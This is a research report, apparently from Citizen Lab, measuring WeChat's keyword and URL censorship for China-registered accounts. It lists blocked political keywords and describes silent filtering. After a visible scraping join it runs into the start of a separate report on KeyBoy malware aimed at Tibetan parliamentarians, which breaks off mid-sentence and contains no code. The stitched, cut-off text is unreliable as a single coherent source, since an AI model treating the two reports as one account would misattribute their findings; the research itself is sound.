Web\nIn 2015, WeChat introduced a temporary feature to commemorate Martin Luther King Day in the United States. If users typed “civil rights” into the chat window, animated American flag emojis would rain down on the screen (see Figure 2). This feature was only intended for users based in the U.S., but was accidentally enabled for China-based users. Tencent was criticized in China for the mistake, quickly disabled the feature for China based users, and issued a statement: “WeChat’s path to internationalization isn’t easy… We will try even harder!”.\nThese incidents demonstrate the balancing act Chinese tech companies must perform, as they attempt to grow outside of China while staying within the lines of domestic regulations.\nFigure 2: Screenshot of animated American flags raining down on the screen when WeChat users typed “civil rights” into the chat window.\nHow WeChat Censors Keywords\nKeyword censorship can be implemented in two ways: on the client-side (i.e., on the application itself) or on the server side (i.e., on a remote server). In a client-side implementation, all of the rules to perform censorship are inside of the application running on your device. Often the application has a built-in list of keywords that it uses to perform checks to determine if any of these keywords are present in your chat messages before your messages are sent. If your message contains a keyword from the list then the message is not sent. In a server-side implementation the rules to perform censorship are on a remote server. When a message is sent, it passes through the server that checks if banned keywords are present and, if detected, blocks the message.\nClient-side implementations can be analyzed by reverse engineering the application and extracting the keyword lists used to trigger censorship A censorship keyword list provides a comprehensive look into exactly what content an application was censoring over a specific period of time. Previous research has uncovered client-side censorship in TOM-Skype (the version of Skype available for the Chinese market until 2013), Sina UC (a chat app that was provided by Sina Corporation), and live-streaming platforms used in China. Client-side censorship was also found in LINE, a mobile chat client developed by a Japanese company and marketed to countries around the world, including China. The keyword filtering features in LINE were only enabled for users with accounts registered to mainland China phone numbers in an effort to comply with Chinese regulations.\nServer-side implementations pose greater challenges for researchers. Analyzing server-side implementations generally rely on sample testing in which researchers develop a set of content suspected to be blocked by a platform, send the sample to the platform, and record the results. In the case of a chat app, this process means developing a set of keywords suspected to be blocked, sending these keywords in a chat, and documenting if the keyword is received or not and if any warning message is presented. In comparison to extracting keyword lists from client-side implementations, sample testing cannot gain a comprehensive view of what a platform is censoring, as the results are only as accurate as the overlap between the sample and the actual content filtered.\nWeChat censors keywords on the server-side. Therefore, sample testing has to be used to determine what specific keywords are blocked. In the next section, we describe previous sample testing results on WeChat.\nPrevious Examples of WeChat Keyword Censorship\nFollowing the 2013 media reports of international users experiencing keyword filtering, we ran a series of tests to attempt to document the presence of the filtering and determine the conditions that trigger it.\nIn May 2013, using a WeChat account registered to a U.S. phone numbers while on a Chinese network, we found keyword censorship of “法轮功” (Falun Gong) but not for “南方周末” (Southern Weekend). Running the same test from a U.S.-based network with the same accounts resulted in no censorship for “法轮功”. These results suggest that at that time, censorship was triggered depending on what network the user was on.\nIn December 2013, we ran a similar test using an account registered to a mainland China phone number while on a Canadian network. Again, our test found that the keyword “法轮功” (Falun Gong) was being filtered but “南方周末” (Southern Weekend) was not. Figure 3 shows screenshots from our two rounds of testing in 2013.\nFigure 3: Evidence of censorship in WeChat’s one-to-one chat feature. Left: May 2013, WeChat client using an account registered to a U.S. phone number running from a Chinese network. Right: Dec 2013, WeChat client using an account registered to mainland China phone number running from a Canadian network.\nIn tests undertaken later, in January and February 2014, we were unable to reproduce the blocking of “法轮功” (Falun Gong) nor did we uncover any censorship when we tested sets of keywords extracted in previous work on chat app censorship. We were also unable to trigger blocking when attempting to reproduce the conditions of our May 2013 test by using a VPN based in China and by spoofing GPS locations in China.\nWeChat Public Account Censorship\nIn 2012, WeChat introduced a Public Accounts platform (微信公众平台), which allows individuals and companies to publish short blog posts to which other users can subscribe.\nIn a previous Citizen Lab report, Jason Q. Ng provided the first attempt at systematically identifying what is censored on the Public Account platform by downloading over 36,000 unique public account posts between June 2014 and March 2015, monitoring them over time and tracking whether they were deleted, distinguishing between posts that the system reports were deleted by the user or posts that the system acknowledges were censored by WeChat. The results suggest that there is a list of blacklisted keywords–possibly including words related to Falun Gong and June 4  (the anniversary date of the Tiananmen Square protests), among others–that would set off automatic review filters, which prevent a post from ever being published in the first place. Furthermore, posts containing keywords related to issues such as corruption and Chinese officials were much more likely to be censored by WeChat.\nAlso of note was the error message WeChat provided indicating that a post had been censored (see Figure 4). The reason for the deletion is attributed to a WeChat users’ peers, suggesting that WeChat is playing the role of a hands-off moderator, letting its users independently decide whether a piece of content is appropriate and only acting as a judge after a post has been flagged too many times. However, analysis by Jason Q. Ng shows that certain sensitive keywords were vastly underrepresented in both censored and uncensored posts. This finding combined with anecdotal reports by Public Account users indicated the presence of built-in automatic review filters that preemptively blocked posts from ever being published. Furthermore, a thorough reading of hundreds of censored posts also raises doubts about how many were organically reported by users as opposed to actively removed by WeChat. This questionable framing of WeChat as a neutral third-party in censorship decisions is similarly seen in the error messages provided when a website is blocked from access in WeChat’s internal browser. This issue of attribution and transparency of censorship (or lack of it) are issues explored in the Discussion section of this report.\nFigure 4: The warning message presented when a user accesses a censored WeChat Public Post reads, “The content has been reported by multiple people. Relevant content cannot be viewed.”\nTracking Censorship on WeChat\nIn June 2016, we found that the keywords “法轮功” (Falun Gong in simplified Chinese) and “法輪功” (Falun Gong in traditional Chinese) were filtered in one-to-one chat on WeChat on an account registered to a Chinese phone number used on a Canadian network. In our previous tests, users were sent the warning message: “Your message could not be sent due to local laws, regulations, and policies.” In the June 2016 tests, no warning is sent to the user and the message is not delivered to the receiver. Neither party is aware that any censorship has taken place. Unless the sender and the receiver compare their chat logs, there is no indication that the message was not delivered or received. We found that  “法轮功” is similarly censored in group chat with no notifications provided to the sender nor to any of the other members in the group.\nFollowing these initial findings, we ran systematic tests to determine the content, scope, and triggers of keyword censorship in one-to-one and group chats. We registered four accounts for testing purposes: two registered to mainland China phone numbers, one to a Canadian phone number, and one to a U.S. phone number. We then conducted sample testing using keywords we had previously extracted from other applications used in China that implement client-side keyword filtering.\nOne-To-One Chat Censorship\nIn June 2016, we tested 26,821 keywords from our keyword sample using two accounts registered to mainland China phone numbers on a Canadian network. Out of our sample, only “法轮功” (“Falun Gong” in simplified Chinese characters) and “法輪功“ (“Falun Gong” in traditional Chinese characters) were filtered (see Figure 5).\nFigure 5: Evidence of censorship in WeChat’s one-to-one chat feature. The users cannot send or receive the message with the keyword “法轮功”. No indication is provided to either user that the message has been blocked.\nIn August 2016, we ran the same tests using two accounts, one registered to a mainland China number and the other to a U.S. number. We conducted all our tests on Canadian networks. We could not reproduce the filtering results of “法轮功” or “法輪功” and did not find any other keywords blocked from our sample. Figure 6 shows a China account successfully sending “法轮功” to a Canadian account.\nFigure 6: In August 2016, our tests showed that “法轮功” was not filtered in one-to-one chats.\nGroup Chat Censorship\nWeChat offers a group chat feature that allows up to 500 users to share a chat room.\nIn July 2016, we tested the same 26,821 keywords on group chat using four accounts (two registered to China numbers, one to U.S., and one to Canada). For these tests, we used the China accounts as the designated message sender.\nInitially, we tested a large number of keywords from our list at a time by copying and pasting into the chat window a few hundred keywords at once. If the list was censored, we would then use binary search to test half of the list at a time to narrow in on the blocked keyword.  A similar methodology has been used by researchers to map out keywords used by China’s national level web filtering system, commonly known as the the Great Firewall.\nOur testing quickly found numerous instances in which combinations of keywords would trigger blocking but if the same keywords were sent individually they would not be blocked. Figure 7 shows an example of this blocking. When the user with a China account sends a message with the keywords “六四” (six four),  “学生” (student), and “民主运动” (democracy movement), the message is blocked, but if these keywords are sent individually the message goes through. The three keywords will trigger censorship if they are all present in any part of the message as shown in our example: “我的生日在六四。我是一名学生。我在读一本关于民主运动的书” (“My birthday is on June 4. I am a student. I’m reading a book about democracy movements”).\nFigure 7: A user with a China account attempts to send a message with the keyword combination “六四” [+] “学生” [+] “民主运动” in a group chat to users with International accounts and is blocked. If the keywords are sent individually they are received.Other keywords must be used as a phrase to trigger blocking. In Figure 8, a user with a China account attempts to send a message with the phrase “六四纪念馆” (June 4 Memorial), and the message is blocked. However, if the keywords are separated and used in a sentence the message is received: “今天是六四, 我要去纪念馆” (“Today is June fourth, I will go to the memorial).\nFigure 8: A user with a China account attempts to send a keyword phrase “六四纪念馆” in a group chat to users with International accounts and is blocked. When the keywords were separated, the message was received.\n \nTo streamline the testing, we wrote a python script that takes our sample list of 26,821 keywords and partitions it into segments of keywords, each at most 100 keywords.  The script starts at the beginning of the list and generates a segment by sequentially adding keywords from the list until either the segment is 100 keywords long or adding another keyword would cause the segment of keywords when pasted into WeChat to be censored.  After the first segment is complete, the script continues using keywords from the list to begin building the second segment using the same rules, and so on until every word from the list is partitioned into a segment. Using this method, if we have already discovered every keyword censored on WeChat, then none of the keyword segments generated will be censored when we try sending them. This method allows us to avoid time unintentionally triggering censored keywords that we had already discovered but that were hidden in combinations of other keywords in ways that are difficult to recognize manually.\nCensored Keyword Content\nOut of our keyword sample we found 174 keywords that trigger censorship. These keywords include 95 keyword phrases and 79 keyword combinations.  Table 1 shows the distribution of languages and keyword types.\n\n\n\nLanguage\nKeyword Combo\nKeyword Phrase\n\n\nSimplified Chinese\n60\n79\n\n\nTraditional Chinese\n17\n11\n\n\nUyghur\n1\n5\n\n\nEnglish\n1\n0\n\n\n\nTable 1: The number of blocked keywords in different languages per keyword type.\nWe used machine and human translation to translate the keywords to English and analyzed the context behind each one. Based on interpreting these translations with contextual information, we coded each keyword into content categories grouped under general themes according to a code book we developed in previous work.\nFigure 9 shows the distribution of the themes and categories. We describe each theme in detail below.\nFigure 9: Distribution of blocked Keywords by Theme and Category\nEvent\nThe Event theme includes keywords that reference 6 distinct events. The highest percentage of Event keywords and blocked keywords overall were related to the June 4 1989 Tiananmen Square Massacre, which remains one of the most taboo events in China. Reactive censorship on social media in China often accompanies the anniversary of the event, and the government continues to push revisionist narratives of what happened. Previous research on keyword censorship on chat apps and live streaming apps have also found a high percentage of June 4 related keywords blocked. Keywords in this category included 50 keyword combinations  (e.g. 真相 [+] 共产党 [+] 64屠杀, “Truth [+] Communist Party [+] 64 Massacre”) and 46 keyword phrases (e.g. 六四天安门, “June 4 Tiananmen”; 勿忘六四, “Don’t Forget June 4”).\nOther event related categories had single keyword references. Events include corruption cases featuring high profile leaders such as Bo Xilai (我的最后陈述 薄熙来, “My last statement Bo Xilai”), and references to pro-democracy movements in China (茉莉花革命 “Jasmine Revolution”).\nOther keywords referenced more obscure events. In November 2015,  a popular online travel show, “On The Road” was banned in China after an episode in which the hosts visited Kurdish fighters in northern Iraq and flew a drone that filmed ISIS military positions in neighbouring Syria. The hosts claimed the footage was shared with the French Air Force who used it to target bombing raids. Media reports claim the show may have been banned over concern that it could incite retaliation from ISIS. We found the keyword “Hold Fast Kobane Syria” (坚守科巴尼 叙利亚) blocked on WeChat, which is the title of the episode that led to the show being banned.\nPeople\nKeywords in the People theme are all references to officials in the Communist Party of China, including 14 keyword combinations and 7 keyword phrases.\nKeywords included derogatory references to leaders such as “Jiang Toad” (江蛤蟆), which is a meme started by Chinese netizens likening the appearance of former Chinese President Jiang Zemin to a toad. Another example uses a combination of keywords (习包子) “Steamed Bun Xi” and (习特勒) “Xi-tler” that reference two nicknames for current Chinese President Xi Jinping. The word steamed bun (包子) is used to refer to Xi following the circulation of a photo showing him ordering lunch at a steamed bun shop that was subsequently criticized as a political show. The second nickname is a comparison of Xi to Adolf Hitler. Recently, a Chinese activist was detained by police when he shared plans to wear a t-shirt with “Xi-tler” and  “习包子” on it.\nOther keywords reference rumors including the false claim that Jiang Zemin had died (江泽民 死了, “Jiang Zemin Died”) and allegations that Bo Xilai and Zhou Yongkang were planning a coup against President Xi (周永康 薄熙来 政变, “Zhou Yongkang Bo Xilai Coup”).\nPolitical\nCategories in the Political theme cover a range of issues including criticism of the CPC, democracy movements, religious groups, and ethnic minority groups. The theme includes 12 keyword combinations and 39 keyword phrases.\nKeywords criticizing the CPC include general statements (e.g, 推翻中国共产党, overthrow the Chinese Communist Party”) and references to the Tuidang movement started by the religious group Falun Gong in the early 2000s, which criticises the party and encourages members to withdraw from it (e.g., 九评共产党, “Nine commentaries on the Communist Party”). References to Falun Gong itself are also blocked (e.g., 法轮功, Falun Gong).\nThe government of China maintains tight control over news media especially those owned and operated by foreign organizations. Blocked keywords include names of news organizations that operate outside of China and critically report on political affairs including Epoch Times (大纪元), Radio Free Asia (自由亚洲电台), and Duowei News (多维新闻).\nThe government also extends strict regulations to the book publishing industry, pushing dissident and tabloid authors to Hong Kong and Taiwan to publish on sensitive topics. The sale of banned books was highlighted in 2015 when employees of a Hong Kong bookshop specializing in taboo titles went missing, only to later emerge in custody in mainland China. Their disappearances had a chilling effect on publishers in Hong Kong who pulled sensitive titles from their shelves. Blocked keywords include titles of banned books on alleged power struggles in the CPC and general political gossip (e.g., 十九大争夺战, “19th Party Congress Power Fight”) and combinations of keywords (e.g., 老江 [+] 气杀习大大/老江 [+] 氣殺習大大, “Old Jiang is More Fierce Than Uncle Xi”).\nAnother target for blocking are ethnic minority groups. Previous studies of social media censorship in China have found that Tibet-related content is routinely censored. On WeChat, we identify four blocked Tibet-related keywords including references to the Tibetan independence movement (自由西藏, “Free Tibet”) and a Tibetan rights group (藏青会, “Tibetan Youth Congress”). These keywords are noteworthy given the incidents of Tibetans being arrested by Chinese authorities for sharing Tibet-related content on WeChat.\nWe also found references to Uyghur-related issues. These keywords are in the Uyghur language in both Arabic and Roman script. All of the keywords were related to Islam and generally encourage devotion and sacrifice to the faith (e.g.,  ئاللاھ يولىدا “for the sake of Allah”, دىن ئىسلام يولۋاس “faith is Islam”). Previous research on censorship of live streaming apps in China has also found blocked keywords in the Uyghur language.\nSocial\nThe Social theme includes a single keyword referencing online downloads of pornographic images (好莱坞艳照门种子, “Hollywood Sex Photo Gate Torrent”). Our testing sample includes thousands of keywords related to prurient interests, drugs, weapons, and gambling that have been found censored on other applications. It is surprising to find only one keyword related to this category of keywords blocked on WeChat.\nKeyword Censorship Updates\nBased on new events, we performed multiple informal keyword tests following our two periods of systematic testing and found new keywords blocked in response to these events.\nIn August 2016, residents of Lianyungang in China’s north eastern Jiangsu province gathered to protest over rumors that their city is a planned site of a nuclear power plant developed by France and China. On August 17, 2016, we found the following keyword combination blocked  on group chat: “15日实行” (15 day carry out) [+] “全市大罢工” (City-wide strike) [+] “灌云” (Guanyun) [+] “连云港” (Lianyungang). When we checked this keyword combination again in November 2016, it was no longer blocked.\nFrom September 4 to 5, 2016, the 11th meeting of the G20 was held in Hangzhou, China. In President Xi Jinping’s opening speech he made a gaffe accidentally saying “reduce taxes and make roads easy [to travel on], facilitate commerce, and loosen clothing” (轻关易道，通商宽衣) when he should have said “reduce taxes and make roads easy [to travel on], facilitate commerce and be lenient to farmers” (轻关易道，通商宽农). This slip of the tongue was clearly embarrassing for Xi. State propaganda departments issued orders to media and technology groups to censor references to the gaffe and keywords related to the incident have been found blocked on live streaming apps.\nOn September 6 2016, we found that the keyword “通商宽衣” (“Facilitate Commerce and Loosen Clothing”) was blocked on both one-to-one chat and group chat (see Figure 10). As of November 25 2016, this keyword remains blocked on both chat modes.\nFigure 10: The user on the left with a China account attempts to send “通商宽衣” in a one-to-one chat to an International account and is blocked.\nFrom October 24 to 27 2016, the Sixth Plenum of the 18th Communist Party of China Congress was held in Beijing. During this party meeting, Chinese President Xi Jinping received a status lift when the Communist Party gave him the title of “core” leader. It has been over a decade since the title has been used and was only previously given to three leaders: Mao Zedong, Deng Xiaoping, and Jiang Zemin. On November 25, 2016, we found the keyword “习核心” (Xi Core) blocked on group chat.\nThese cases of episodic blocking show that keyword censorship on WeChat is dynamic and influenced by emerging news events. We have observed similar patterns with microblogs, chat apps, and live streaming platforms used in China, which also reactively censor content in response to events. The shifts in the keywords blocked on WeChat pose challenges for research since documenting these occurrences requires testing the right keywords at the right time.\nURL Filtering\nIn our initial testing, we observed that if certain websites are accessed directly via WeChat’s internal browser, a warning message is returned that explains “As monitored by Tencent Security Centre’s Mobile Manager, this website may contain malicious fraud content. Visiting the website has now been terminated.” This warning message is displayed for any blocked URL (see Figure 11).\nFigure 11: Screenshot from WeChat Web presenting a generic warning message for blocked websites “As monitored by Tencent Security Centre’s Mobile Manager, this website may contain malicious fraud content. Visiting the website has now been terminated.”\nOn the mobile and desktop versions, WeChat gives more details about why certain web pages are blocked (see Figure 12).  In total, we documented eight unique English warning messages and 13 unique Chinese warning messages depending on the type of content being accessed (see the copies of the warnings in text and html).\nFigure 12: Screenshot of English and Chinese warning message presented to users on WeChat mobile and desktop versions when attempting to access blocked URLs.\nTo automate the testing of URL censorship, we analyzed the web version of WeChat and found that it implements censorship by pointing each link to an interstitial page. Depending on the link, the interstitial page either (1) silently sends the user via an HTTP redirect to the link, (2) warns the user that some pages may be malicious and has a link for the user to manually click on to get to the page, or (3) blocks the page and displays a reason for the block.  Most sites belong to case (2), which appears to be the default case.  We call sites in cases (1) and (3) “whitelisted” and “censored,” respectively.\nTo automate testing under an account, we signed in under that account using Firefox. We manually clicked on a link, epochtimes.com, to display its interstitial page. We used Firefox developer tools to generate a curl request that would emulate the request the browser made for the page, including all cookies and other HTTP request headers. We automated the testing of URLs by substituting the occurrence of epochtimes.com with other URLs.\nUsing this methodology, we tested the entire list of Alexa’s Top One Million Websites under different accounts and on the following three different network vantage points:\n\nA Canada account on an American network\nA China account on an American network\nA China account on a Chinese network\n\nWe found that some sites (including pornography and gambling websites) that we found blocked were intermittently accessible. We hypothesize that this may be due to load balancing and some servers using older versions of the URL lists.  Although we found evidence of load balancing (i.e., multiple IP addresses per hostname and multiple TCP timestamp clocks per IP address), we cannot definitively show that load balancing is responsible for this phenomenon.\nTo eliminate the variability of this phenomenon, we retested every URL that not all three vantage points agreed upon. After any retest, if all three vantage points now agreed on a URL, we eliminated it from further retesting. On the third retest, no more new URLs were in perfect agreement than were after the second retest with one exception.1 We used this methodology since the aim of our analysis was to compare the differences between censorship on different accounts and networks, and we preferred false negatives (i.e., failing to report differences between vantage points) to false positives (i.e., falsely reporting a difference between vantage points). Table 2 provides a summary of our results.\n\n\n\nUnique to vantage point(s)\nCase\nNumber of unique URLs\n\n\nChina account on either network\nBlocked\n41\n\n\nCanada account on American network\nWhitelisted\n90\n\n\nEither account on American network\nWhitelisted\n24\n\n\nChina account on either network\nWhitelisted\n254\n\n\n\nTable 2: The number of unique URLs blocked or whitelisted using different vantage points.\nFigure 13 shows an example of a website blocked (ndtv.com) on a China account, being accessible from an international account.\nFigure 13: On the left a China account attempts to access a blocked website (ndtv.com) and receives a warning message. On the right an International account is able to access the website.\nWe automatically categorized the URLs collected from the three vantage points using Bright Cloud, a URL classification service. Manual adjustments were made to the automatically categorized results where necessary.\nThe results of this categorization show that the majority of the websites (76%) blocked only on China accounts are related to online gambling (see Figure 14). The second largest category (20%) was news and media websites, which include Falun Gong supported media (e.g., ndtv.com), websites reporting on human rights issues in China (e.g., peacehall.com), and the website of the International Consortium of Investigative Journalists (icij.org) which reported on the Panama Papers.\nFigure 14: Distribution of the categories of blocked websites. A total of 41 websites on the Alexa’s Top One Million Websites list the are uniquely blocked to Chinese WeChat accounts.\nWe also found that every site that is uniquely blocked using China accounts is uniquely whitelisted for the Canadian account on the American network (view the full list on our github).\nAs of October 4, 2016, URL filtering appears to have been lifted for all non-China based accounts for the websites in our test sample.\nOne App, Two Systems\nTechnology companies operating in multiple jurisdictions face the challenge of complying with varying content regulations. Google, Facebook, Twitter, and other major companies have published Transparency Reports detailing the requests they receive from governments to take down content. Some applications have added features that prevent users from seeing certain content based on their location. For example, Twitter withholds content from users based\non where they are currently located if the company has received and approved a government request to block content in that jurisdiction.\nSocial media companies operating in China are expected to maintain content filtering to comply with government regulations. Foreign companies entering the Chinese market must also take on this cost of doing business. When LINE Corporation attempted to push its chat app into China, it enabled keyword censorship on the app if a user registered an account with a mainland China phone number. WeChat faces a similar but inverted dilemma. As the company grows internationally, it must maintain content controls for users in China and an unfettered experience for those outside.\nSimilar to LINE, WeChat enables filtering if a user registers with a mainland China phone number. Unlike LINE, even if the account is later paired with a non-mainland China number it is still subject to the same censorship, which means if the user travels outside of China or moves away from the country they remain effectively within the borders of its content control. Users potentially affected by this restriction are vast: students studying abroad, tourists, business travelers, academics attending international conferences, and anyone who has recently emigrated out of China.\nThere are at least three potential explanations for this restriction: (1) Unintentional development oversight; (2) Intentional design decision due to range of other features only available to China-based users; (3) Intentional design decision to ensure mainland China accounts are always under filtering. We further describe and assess each scenario below:\nIt is possible that the restriction is unintentional and due to a development oversight. WeChat has had problems before with regional features; filtering intended for China-based users was inadvertently turned on for international users, emoji features intended only for U.S.-based users were mistakenly turned on for users in China. Maintaining a large code base for millions of users in multiple jurisdictions with varying content conditions is complicated, and bugs in any software project are inevitable. It is therefore plausible that the account restriction is unintentional.\nKeyword censorship is not the only unique feature for China-based WeChat users. Other features such as WeChat Wallet, which allows users to connect credit and bank cards to the app and make mobile payments, are widely popular in mainland China and are not currently available for the majority of international users (see Figure 15).2 It is possible that for sake of simplicity and efficiency, developers kept all China-only features enabled on the app to ensure users do not lose access to them if they travel or move outside the country. Since features like Wallet include financial data there are clear incentives to prioritize continued access. However, bucketing features by user registration would mean keyword filtering remains on as well.\nFigure 15: Screenshots of user profile pages for WeChat accounts registered in the US (left), China (Middle). Only the China account has access to WeChat wallet features. The interface to WeChat Wallet is shown on the right.\nFinally, it is possible that the account restrictions are intentionally implemented to ensure filtering is always on for mainland China registered users even if they travel or move outside of the country. The CPC promotes maintaining ideological connections and guidance with Chinese citizens overseas, particularly for students studying abroad. Tencent may be pressured to ensure filtering persists for Chinese users in any location.\nWe cannot conclusively determine which of these scenarios is true and it is possible there are other explanations that we have not considered. However, whether the motive is intentional or accidental, the outcome is the same: mainland China WeChat users face censorship regardless of where they are in the world.\nSilent Censorship\nOne of our most striking findings is that keyword censorship on WeChat is now performed without any notice to users. In media reports and our own previous tests we observed two different warnings that users would receive if they sent blocked keywords (see Figure 16).\nFigure 16: Screenshots of blocked keyword messages reported in January 2013 by The Next Web (on the left) and from our own tests in December 2013 (on the right).\nThe first warning message reported by media in January 2013, notifies users which keyword is restricted. The second warning message observed in our May 2013 and December 2013 tests does not specify which keyword triggered the blocking, but explains that the message infringed on “local laws, regulations and policies.” While these messages are vague, they provide a level of transparency to users, confirming the message cannot be sent. Now keyword censorship is done without giving a user any indication that messages are blocked, which significantly decreases the level of transparency in the app.\nOther social media and chat apps used in China exhibit varying levels of notification when user content is blocked. On many of these apps, when a user sends a message with a blocked keyword they are presented with a warning notification that explains the message is prohibited. The user on the other end of the communication may also see recieve a warning notification or see the blocked message as a series of asterisks (e.g., ****). Other apps including YY and TOM-Skype silently filtered messages with no notification given to the user. Notably both of these apps also conduct keyword surveillance logging censored messages that users send. China’s national level filtering system (the Great Firewall of China) filters websites without sending users a block page or any other obvious indication that the requested content is censored. Instead users receive a network timeout error, which on the surface could appear to be the result of routine networking issues.\nWhile the exact motivations behind this diminished transparency are unknown, filtering keywords without explicit user notice does provide a semblance of plausible deniability and makes censorship on WeChat resemble how the Great Firewall of China operates, which is by design opaque and unaccountable.\nThe Larger the Audience, the Greater the Censorship\nThe greater level of censorship on group chat compared to one-one chat may be due to the semi-public sphere feature of online discussion groups, making the latter subject to a higher degree of scrutiny.\nTencent has been very conscious about turning its public account and group chat features into another Sina Weibo, China’s Twitter-like service, where a single post could spread very quickly and widely on the Internet. Group chat is catching on and is one of the top four activities (61.7%) users engage in on WeChat.  In July 2014, Tencent increased WeChat’s group size limit from 100 to 500 users per group. But as the group chat feature grows, restrictions on it tighten. Users who want to join a WeChat group of over 100 persons must first register the WeChat Payment feature and link their WeChat account with their personal bank account (see Figure 17). According to a report, international WeChat users also need to verify their identity by connecting their account with a cellphone number. Since messages on group chats have the potential to reach a wide audience, pressures to control content on the feature may be higher.\nFigure 17: When accepting an invitation to join a groupchat with over 100 members in WeChat, a warning message appears, “You need to verify your real identity before accepting the invitation. You can go to ‘Me’ –> ‘Wallet’ to link your bank account and finish verification.”\nMotivations for URL Filtering\nThe filtering of URLs in WeChat raises the ongoing question of where the line is appropriately drawn between censorship and legitimate moderation of content. Chinese content providers are required by law to restrict access to certain kinds of online material. And while much publicity is given to the censorship of politically-oriented material critical of the government, some of the content which is blocked also relates to non-political affairs that would similarly be blocked on social media platforms internationally.\nA good comparison for how WeChat prevents users from accessing certain websites from within its app is Facebook, which similarly offers such behavior as a protective feature. Users trying to click through to malware or malicious scams are presented with a “link shim,” an interstitial screen which warns a user about the site they are trying to access. Similarly,  Google Chrome includes a feature called “Safe Browsing” that protect users against malicious sites and extensions.\nAs with Facebook, WeChat also offers interstitials reminding users to to be wary of sharing their passwords or private financial information; it could be argued that such screens serve a similar sort of protective service. However, the benefits of such a service are muddled when one considers that other links do not receive any interstitial and are fully blocked. Unlike in Google Chrome where users can choose to view the sites and downloads despite warning messages or simply turn off the Safe Browsing feature, WeChat users are unable to proceed within the app even if they explicitly want to. Removing user choice from accessing content would seem to land the URL filtering feature more toward the censorship side rather than the content moderation one.\nAnd while it is fairly trivial to copy and paste the link into an external web browser, bypassing the WeChat URL filtering altogether, the mere fact that WeChat forces a user to jump through such a hurdle would undoubtedly reduce a large amount of the traffic that would under normal circumstances reach the site unimpeded. Does this feature benefit WeChat users, or does it benefit WeChat itself insofar it can claim to authorities that they are doing their part?\nFinally, the source of the URL filtering is ambiguous. While the error messages that appear give reasons for the censorship, it is not often clear how the purported reason matches up with the actual content being censored. Furthermore, as discussed previously, the messages appear to imply that the censorship is bottom up (the content was “reported multiple times,” ostensibly by fellow users) as opposed to imposed from the top down. However, if that is indeed the case, how does one go about reporting a site? What is the redress for incorrectly categorized sites? Is the filtering mostly automated or manual? In this case, transparency is more superficial than real.\nConclusion\nInternet filtering is practiced by states around the world (including both authoritarian and democratic regimes), potentially leading to what has been described as  a “territorialization” of the network. WeChat shows a stark example of how the same borders extend onto popular apps.\nAs companies push to grow products internationally, pressures from governments to remove content or provide user data are inevitable, as demonstrated by the requests documented in annual corporate transparency reports. For China, attention is typically centered on foreign companies attempting to reach into the market and having to decide how to approach the government’s strict content regulations. Recent news of Facebook reportedly working on features to enable geographically-based filtering features in an effort to re-enter China is but the latest example.\nThe challenge that WeChat faces is the inverse. Tencent is one of China’s biggest tech companies and WeChat is one of the most popular apps in the country. Expanding beyond China and finding wider success means WeChat must maintain its user base at home (while staying within regulatory boundaries) and also present a compelling experience to attract international users. In response to this situation, WeChat has seemingly created a “One App, Two Systems” model for censorship.\nThe identity a user creates when they register for WeChat determines which system they will be under. This identity is immutable. Regardless of a user’s location, chosen settings, or attempts to change registration details, they will always be locked into the same system. Even if this restriction is not the functionality intended by WeChat, the idea that such a system is possible is a serious concern for future transnational Chinese citizens–some of whom might in the future even become citizens of other nations.\nAlso of concern is that WeChat’s notices for censoring content have become much more opaque. Users no longer have any form of notification that messages are filtered on chat and the messages that are provided for URL and public post blocking are ambiguous. Furthermore, the nuance between the contexts in which censorship takes place has grown more sophisticated. WeChat turns on censorship only for users registered from mainland China and imposes greater restrictions on those features within the app which allow for the greatest reach. The recognition of the difference between public spaces (public accounts platform) and semi-public spaces (group chat) suggests a desire to integrate censorship ever more tightly and seamlessly into the app depending on the perceived “threat.”\nWhile these controls, combined with more opaque censorship, do on the one hand provide a more friction-less user experience for the vast majority of users, it also shields them from encountering such censorship. By calibrating censorship in such a way, WeChat may hope to either squeeze out the minority who hope to use WeChat as a source for independent news and commentary (as either a broadcaster or consumer) or limit their audience as much as possible.\nAs content filtering and other controls become more invisible and seamless to users, documenting how these features work through the type of research demonstrated in this report is increasingly important to ensure users can make more informed decisions about the apps they use and the social media experiences upon which they rely.\n\nNotes\n1. There were still 14 URLs blocked only when testing a Canadian account on an American network, but inspection shows that these were inconsistently blocked and so would have eventually been eliminated after enough retests, and so we disregard them from our analysis.↩\n2.WeChat has started to roll out WeChat Wallet in new jurisdictions including Hong Kong and South Africa, but it remains most popularly used in mainland China. ↩\nData\nList of Keywords found blocked on China accounts\nList of URLs blocked on China accounts\nURL warning messages (text, html)\nAcknowledgements\nWe are grateful to Zubayra Shamseden (Uyghur Human Rights Project) for translation assistance and Professors Ron Deibert and Jedidiah Crandall for supervision.\n\n\t\t\t\t\n\t\t\t",

They are often targeted simultaneously with other ethnic minorities and religious groups in China. Examples as early as 2008 document  malware operations against Tibetan non-governmental organizations (NGOs) that also targeted Falun Gong and Uyghur groups. More recently in 2016, Arbor Networks reported on connected malware operations continuing to target these same groups, which the Communist Party of China perceives as a threat to its power.\nThese types of operations have multiple components, each with their own associated costs to the operator. There is the exploit code and malware used to gain access to systems, the infrastructure that provides command and control to the malware operator, and the human elements – developers who create the malware, operators who deploy it, and analysts who extract value from the stolen information.\nWe anticipate that operators will attempt to balance the amount of information they expect to gather with the operational costs and risks of deploying different strategies and technologies. For example, in deploying a particular malware implant against a target the operator will balance the likelihood and cost of discovery with the perceived value of extracting information from that target. If a toolkit is exposed inadvertently, the target may increase defenses and the operator will have to spend more time and resources on development.\nCivil society groups, due to their generally limited technical capacity and lack of security expertise and countermeasures, shift the risk/reward ratio in ways favourable to the malware operator. For example, we have observed frequent reuse of older (patched) exploits in malware operations against the Tibetan community. Up-to-date operating systems and software would block these threats, but the operators have probably discovered through experience that the their targets have unpatched systems and a general lack of security controls beyond antivirus programs. The continued use of old exploits is a cost reduction strategy: since they still work, there is little need to use more expensive exploits.\nMoreover, many of the malware defenses used by the Tibetan diaspora involve individuals recognizing signs of a malicious email, such as exhortations to open attachments. This kind of behavioral strategy pushes the operators to change their social engineering tactics, but does not provide pressure to radically change their toolkits. This situation is different from a technical-indicator based institutional security environment. In practice, minimal code changes sufficient to bypass signature-based security controls such as antivirus may be all that are necessary.\nThis report analyzes an operation targeting members of the Tibetan Parliament. The actors used a new version of “KeyBoy,” a custom backdoor first disclosed by researchers at Rapid7 in June 2013. Their work outlined the capabilities of the backdoor, and exposed the protocols and algorithms used to hide the network communication and configuration data.\nWe observed operations in August and October 2016, shortly after an order in June to demolish the Larung Gar Buddhist Academy and days before organized protests on October 19 around the same issue. These operations involved highly targeted email lures with repurposed content and attachments that contained an updated version of KeyBoy. We assess that 